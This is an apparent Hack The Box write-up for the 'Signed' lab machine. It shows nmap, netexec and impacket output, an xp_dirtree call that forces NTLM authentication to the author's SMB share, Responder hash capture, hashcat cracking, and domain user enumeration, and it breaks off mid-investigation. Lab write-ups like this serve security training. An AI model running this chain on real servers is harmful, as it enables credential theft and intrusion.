As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH

## NMAP SCAN
```
nmap -A 10.129.242.173 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-30 00:03 +0700
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 18.50% done; ETC: 00:05 (0:01:19 remaining)
Nmap scan report for 10.129.242.173
Host is up (0.093s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.242.173:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-29T08:54:47
|_Not valid after:  2056-04-29T08:54:47
|_ssl-date: 2026-04-29T09:04:47+00:00; -8h00m03s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.242.173:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_clock-skew: mean: -8h00m02s, deviation: 1s, median: -8h00m03s

TRACEROUTE (using port 1433/tcp)
HOP RTT      ADDRESS
1   92.04 ms 10.10.14.1
2   92.05 ms 10.129.242.173

```

```
netexec mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB) (EncryptionReq:False)
MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH
```
```
impacket-mssqlclient 'scott:Sm230#C5NatH@10.129.242.173'                         
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (scott  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1   

```

lets look around.... 
```
SQL (scott  guest@msdb)> SELECT name FROM sys.tables;
name                                
---------------------------------   
dm_hadr_automatic_seeding_history   
backupmediaset                      
backupmediafamily                   
backupset                           
backupfile                          
restorehistory                      
restorefile                         
restorefilegroup                    
logmarkhistory                      
suspect_pages
```
nothing useful....
```
SQL (scott  guest@msdb)> SELECT name, type_desc FROM sys.server_principals;
name                                  type_desc     
-----------------------------------   -----------   
sa                                    SQL_LOGIN     
public                                SERVER_ROLE   
sysadmin                              SERVER_ROLE   
securityadmin                         SERVER_ROLE   
serveradmin                           SERVER_ROLE   
setupadmin                            SERVER_ROLE   
processadmin                          SERVER_ROLE   
diskadmin                             SERVER_ROLE   
dbcreator                             SERVER_ROLE   
bulkadmin                             SERVER_ROLE   
##MS_ServerStateReader##              SERVER_ROLE   
##MS_ServerStateManager##             SERVER_ROLE   
##MS_DefinitionReader##               SERVER_ROLE   
##MS_DatabaseConnector##              SERVER_ROLE   
##MS_DatabaseManager##                SERVER_ROLE   
##MS_LoginManager##                   SERVER_ROLE   
##MS_SecurityDefinitionReader##       SERVER_ROLE   
##MS_PerformanceDefinitionReader##    SERVER_ROLE   
##MS_ServerSecurityStateReader##      SERVER_ROLE   
##MS_ServerPerformanceStateReader##   SERVER_ROLE   
scott                                 SQL_LOGIN 
```

the users in mssql sv..... 
```
SQL (scott  guest@msdb)> USE master;
ENVCHANGE(DATABASE): Old Value: msdb, New Value: master
INFO(DC01): Line 1: Changed database context to 'master'.
SQL (scott  guest@master)> SELECT name FROM sys.databases WHERE database_id > 4;
name   
----   
SQL (scott  guest@master)> SELECT @@version;
                                                                                                                                                                                                                             
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) 
        Oct  8 2022 05:58:25 
        Copyright (C) 2022 Microsoft Corporation
        Developer Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
```
```
SQL (scott  guest@master)> EXEC master..xp_dirtree '\\10.10.14.53\share', 1, 1;
subdirectory   depth   file   
------------   -----   ---- 
```
```
sudo responder -I tun0 
mssqlsvc::SIGNED:5fd380d43e4a5e7d:02DCEF1E1FA13DCA5F56B9305DC3F134:010100000000000000EA0E5A37D8DC0163C5CB145570384800000000020008005500560050004B0001001E00570049004E002D004F004C0054004E00500056004F004F0044003700530004003400570049004E002D004F004C0054004E00500056004F004F004400370053002E005500560050004B002E004C004F00430041004C00030014005500560050004B002E004C004F00430041004C00050014005500560050004B002E004C004F00430041004C000700080000EA0E5A37D8DC0106000400020000000800300030000000000000000000000000300000BCBABCA0759315B93BE81B93A61AA9E86EC7ACB5EB4527258623614C23CA188E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350033000000000000000000
```
good thing we got this.... lets crack it 
```
MSSQLSVC::SIGNED:5fd380d43e4a5e7d:02dcef1e1fa13dca5f56b9305dc3f134:010100000000000000ea0e5a37d8dc0163c5cb145570384800000000020008005500560050004b0001001e00570049004e002d004f004c0054004e00500056004f004f0044003700530004003400570049004e002d004f004c0054004e00500056004f004f004400370053002e005500560050004b002e004c004f00430041004c00030014005500560050004b002e004c004f00430041004c00050014005500560050004b002e004c004f00430041004c000700080000ea0e5a37d8dc0106000400020000000800300030000000000000000000000000300000bcbabca0759315b93be81b93a61aa9e86ec7acb5eb4527258623614c23ca188e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00350033000000000000000000:purPLE9795!@
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: MSSQLSVC::SIGNED:5fd380d43e4a5e7d:02dcef1e1fa13dca5...000000
Time.Started.....: Thu Apr 30 00:24:10 2026 (3 secs)
Time.Estimated...: Thu Apr 30 00:24:13 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1333.8 kH/s (1.40ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4490240/14344385 (31.30%)
Rejected.........: 0/4490240 (0.00%)
Restore.Point....: 4485120/14344385 (31.27%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: purdaliza -> punkrocker95
Hardware.Mon.#01.: Util: 32%
```
got the pass....
mssqlsvc:purPLE9795!@
```
netexec mssql 10.129.242.173 -u mssqlsvc -p 'purPLE9795!@'             
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB) (EncryptionReq:False)
MSSQL       10.129.242.173  1433   DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
```
lets look for users

```
netexec mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth --rid-brute
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB) (EncryptionReq:False)
MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH 
MSSQL       10.129.242.173  1433   DC01             498: SIGNED\Enterprise Read-only Domain Controllers
MSSQL       10.129.242.173  1433   DC01             500: SIGNED\Administrator
MSSQL       10.129.242.173  1433   DC01             501: SIGNED\Guest
MSSQL       10.129.242.173  1433   DC01             502: SIGNED\krbtgt
MSSQL       10.129.242.173  1433   DC01             512: SIGNED\Domain Admins
MSSQL       10.129.242.173  1433   DC01             513: SIGNED\Domain Users
MSSQL       10.129.242.173  1433   DC01             514: SIGNED\Domain Guests
MSSQL       10.129.242.173  1433   DC01             515: SIGNED\Domain Computers
MSSQL       10.129.242.173  1433   DC01             516: SIGNED\Domain Controllers
MSSQL       10.129.242.173  1433   DC01             517: SIGNED\Cert Publishers
MSSQL       10.129.242.173  1433   DC01             518: SIGNED\Schema Admins
MSSQL       10.129.242.173  1433   DC01             519: SIGNED\Enterprise Admins
MSSQL       10.129.242.173  1433   DC01             520: SIGNED\Group Policy Creator Owners
MSSQL       10.129.242.173  1433   DC01             521: SIGNED\Read-only Domain Controllers
MSSQL       10.129.242.173  1433   DC01             522: SIGNED\Cloneable Domain Controllers
MSSQL       10.129.242.173  1433   DC01             525: SIGNED\Protected Users
MSSQL       10.129.242.173  1433   DC01             526: SIGNED\Key Admins
MSSQL       10.129.242.173  1433   DC01             527: SIGNED\Enterprise Key Admins
MSSQL       10.129.242.173  1433   DC01             553: SIGNED\RAS and IAS Servers
MSSQL       10.129.242.173  1433   DC01             571: SIGNED\Allowed RODC Password Replication Group
MSSQL       10.129.242.173  1433   DC01             572: SIGNED\Denied RODC Password Replication Group
MSSQL       10.129.242.173  1433   DC01             1000: SIGNED\DC01$
MSSQL       10.129.242.173  1433   DC01             1101: SIGNED\DnsAdmins
MSSQL       10.129.242.173  1433   DC01             1102: SIGNED\DnsUpdateProxy
MSSQL       10.129.242.173  1433   DC01             1103: SIGNED\mssqlsvc
MSSQL       10.129.242.173  1433   DC01             1104: SIGNED\HR
MSSQL       10.129.242.173  1433   DC01             1105: SIGNED\IT
MSSQL       10.129.242.173  1433   DC01             1106: SIGNED\Finance
MSSQL       10.129.242.173  1433   DC01             1107: SIGNED\Developers
MSSQL       10.129.242.173  1433   DC01             1108: SIGNED\Support
MSSQL       10.129.242.173  1433   DC01             1109: SIGNED\oliver.mills
MSSQL       10.129.242.173  1433   DC01             1110: SIGNED\emma.clark
MSSQL       10.129.242.173  1433   DC01             1111: SIGNED\liam.wright
MSSQL       10.129.242.173  1433   DC01             1112: SIGNED\noah.adams
MSSQL       10.129.242.173  1433   DC01             1113: SIGNED\ava.morris
MSSQL       10.129.242.173  1433   DC01             1114: SIGNED\sophia.turner
MSSQL       10.129.242.173  1433   DC01             1115: SIGNED\james.morgan
MSSQL       10.129.242.173  1433   DC01             1116: SIGNED\mia.cooper
MSSQL       10.129.242.173  1433   DC01             1117: SIGNED\elijah.brooks
MSSQL       10.129.242.173  1433   DC01             1118: SIGNED\isabella.evans
MSSQL       10.129.242.173  1433   DC01             1119: SIGNED\lucas.murphy
MSSQL       10.129.242.173  1433   DC01             1120: SIGNED\william.johnson
MSSQL       10.129.242.173  1433   DC01             1121: SIGNED\charlotte.price
MSSQL       10.129.242.173  1433   DC01             1122: SIGNED\henry.bennett
MSSQL       10.129.242.173  1433   DC01             1123: SIGNED\amelia.kelly
MSSQL       10.129.242.173  1433   DC01             1124: SIGNED\jackson.gray
MSSQL       10.129.242.173  1433   DC01             1125: SIGNED\harper.diaz
MSSQL       10.129.242.173  1433   DC01             1126: SIGNED\SQLServer2005SQLBrowserUser$DC01

```

```
SQL (SIGNED\mssqlsvc  guest@msdb)> enum_impersonate
execute as   database   permission_name   state_desc   grantee    grantor                        
----------   --------   ---------------   ----------   --------   ----------------------------   
b'USER'      msdb       IMPERSONATE       GRANT        dc_admin   MS_DataCollectorInternalUser  
```

interesting now which user tho...
